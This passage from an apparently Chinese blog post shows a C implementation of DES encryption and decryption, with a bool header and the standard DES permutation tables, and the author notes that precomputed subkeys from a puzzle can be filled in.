</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Xor</span>(<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatA,<span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>DatB,<span style="color:#66d9ef">int</span> Num) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Num; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        DatA[i] <span style="color:#f92672">=</span> DatA[i] <span style="color:#f92672">^</span> DatB[i];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">S_Change</span>(<span style="color:#66d9ef">bool</span> DatOut[<span style="color:#ae81ff">32</span>],<span style="color:#66d9ef">bool</span> DatIn[<span style="color:#ae81ff">48</span>]) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i,X,Y;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, Y <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, X <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span>, DatIn <span style="color:#f92672">+=</span> <span style="color:#ae81ff">6</span>, DatOut <span style="color:#f92672">+=</span> <span style="color:#ae81ff">4</span>) {
</span></span><span style="display:flex;"><span>        Y<span style="color:#f92672">=</span>(DatIn[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> DatIn[<span style="color:#ae81ff">5</span>];
</span></span><span style="display:flex;"><span>        X<span style="color:#f92672">=</span>(DatIn[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> (DatIn[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> (DatIn[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> DatIn[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> v9 <span style="color:#f92672">=</span> S_Box[i][Y][X];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>; j <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; j<span style="color:#f92672">--</span>) {
</span></span><span style="display:flex;"><span>            DatOut[j] <span style="color:#f92672">=</span> v9 <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>            v9 <span style="color:#f92672">/=</span> <span style="color:#ae81ff">2</span>;   
</span></span><span style="display:flex;"><span>        }         
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">F_Change</span>(<span style="color:#66d9ef">bool</span> DatIn[<span style="color:#ae81ff">32</span>],<span style="color:#66d9ef">bool</span> DatKi[<span style="color:#ae81ff">48</span>]) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> MiR[<span style="color:#ae81ff">48</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TablePermute</span>(MiR,DatIn,E_Table,<span style="color:#ae81ff">48</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Xor</span>(MiR,DatKi,<span style="color:#ae81ff">48</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">S_Change</span>(DatIn,MiR);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TablePermute</span>(DatIn,DatIn,P_Table,<span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">SetKey</span>(<span style="color:#66d9ef">char</span> KeyIn[<span style="color:#ae81ff">8</span>]) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> KeyBit[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>KiL <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>KeyBit[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">*</span>KiR <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>KeyBit[<span style="color:#ae81ff">28</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ByteToBit</span>(KeyBit, KeyIn, <span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TablePermute</span>(KeyBit, KeyBit, PC1_Table, <span style="color:#ae81ff">56</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">LoopMove</span>(KiL, <span style="color:#ae81ff">28</span>, Move_Table[i]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">LoopMove</span>(KiR, <span style="color:#ae81ff">28</span>, Move_Table[i]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">TablePermute</span>(SubKey[i], KeyBit, PC2_Table, <span style="color:#ae81ff">48</span>); 
</span></span><span style="display:flex;"><span>    }        
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">PlayDes</span>(<span style="color:#66d9ef">char</span> MesOut[<span style="color:#ae81ff">8</span>],<span style="color:#66d9ef">char</span> MesIn[<span style="color:#ae81ff">8</span>]) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> MesBit[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Temp[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>MiL <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>MesBit[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">*</span>MiR <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>MesBit[<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ByteToBit</span>(MesBit, MesIn, <span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TablePermute</span>(MesBit, MesBit, IP_Table, <span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d &#34;</span>, MesBit[i]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BitsCopy</span>(Temp, MiR, <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">F_Change</span>(MiR, SubKey[i]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Xor</span>(MiR, MiL, <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BitsCopy</span>(MiL, Temp, <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; j<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d &#34;</span>, MesBit[j]);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> tmp <span style="color:#f92672">=</span> MesBit[i];
</span></span><span style="display:flex;"><span>        MesBit[i] <span style="color:#f92672">=</span> MesBit[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>        MesBit[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> tmp;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TablePermute</span>(MesBit, MesBit, IPR_Table, <span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d &#34;</span>, MesBit[i]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">BitToHex</span>(MesOut,MesBit,<span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">KickDes</span>(<span style="color:#66d9ef">char</span> MesOut[<span style="color:#ae81ff">8</span>],<span style="color:#66d9ef">char</span> MesIn[<span style="color:#ae81ff">8</span>]) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> MesBit[<span style="color:#ae81ff">64</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> Temp[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>MiL <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>MesBit[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">*</span>MiR <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>MesBit[<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HexToBit</span>(MesBit, MesIn, <span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TablePermute</span>(MesBit, MesBit, IP_Table, <span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> tmp <span style="color:#f92672">=</span> MesBit[i];
</span></span><span style="display:flex;"><span>        MesBit[i] <span style="color:#f92672">=</span> MesBit[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span>        MesBit[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> tmp;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span>; i <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; i<span style="color:#f92672">--</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BitsCopy</span>(Temp, MiL, <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">F_Change</span>(MiL, SubKey[i]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Xor</span>(MiL, MiR, <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">BitsCopy</span>(MiR, Temp, <span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>    }    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TablePermute</span>(MesBit, MesBit, IPR_Table, <span style="color:#ae81ff">64</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">64</span>; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d &#34;</span>, MesBit[i]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">BitToByte</span>(MesOut, MesBit, <span style="color:#ae81ff">64</span>);        
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>bool.h，我的评价是不如直接上 c++</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#ifndef __BOOL_H__
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define __BOOL_H__
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">enum</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    false <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    true  <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">bool</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span></code></pre></div><p>tables.h，之前找到的文件有几处与题目中不同，不知道是作者写错了还是题目改数了，直接把算好的 subkey 填到这里，就不用再输入密钥算了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#ifndef _TABLES_H_
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define _TABLES_H_  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> IP_Table[<span style="color:#ae81ff">64</span>]<span style="color:#f92672">=</span>{             
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">52</span>,<span style="color:#ae81ff">44</span>,<span style="color:#ae81ff">36</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">62</span>,<span style="color:#ae81ff">54</span>,<span style="color:#ae81ff">46</span>,<span style="color:#ae81ff">38</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">40</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">41</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">43</span>,<span style="color:#ae81ff">35</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">37</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">63</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">7</span> 
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> IPR_Table[<span style="color:#ae81ff">64</span>]<span style="color:#f92672">=</span>{              
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">64</span>,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">63</span>,<span style="color:#ae81ff">31</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">46</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">54</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">62</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">29</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">44</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">52</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">43</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">27</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">25</span>	
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> E_Table[<span style="color:#ae81ff">48</span>]<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>,<span style="color:#ae81ff">10</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">15</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">17</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">25</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">24</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> PC1_Table[<span style="color:#ae81ff">56</span>]<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">41</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">26</span>,<span style="color:#ae81ff">18</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">43</span>,<span style="color:#ae81ff">35</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">52</span>,<span style="color:#ae81ff">44</span>,<span style="color:#ae81ff">36</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">63</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">62</span>,<span style="color:#ae81ff">54</span>,<span style="color:#ae81ff">46</span>,<span style="color:#ae81ff">38</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">22</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">37</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> Move_Table[<span style="color:#ae81ff">16</span>]<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>	 <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> PC2_Table[<span style="color:#ae81ff">48</span>]<span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">14</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">28</span>,<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">21</span>,<span style="color:#ae81ff">10</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">23</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">7</span>,<span style="color:#ae81ff">27</span>,<span style="color:#ae81ff">20</span>,<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">41</span>,<span style="color:#ae81ff">52</span>,<span style="color:#ae81ff">31</span>,<span style="color:#ae81ff">37</span>,<span style="color:#ae81ff">47</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">30</span>,<span style="color:#ae81ff">40</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">45</span>,<span style="color:#ae81ff">33</span>,<span style="color:#ae81ff">48</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">44</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">39</span>,<span style="color:#ae81ff">56</span>,<span style="color:#ae81ff">34</span>,<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">46</span>,<span style="color:#ae81ff">42</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">36</span>,<span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">32</span>	
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
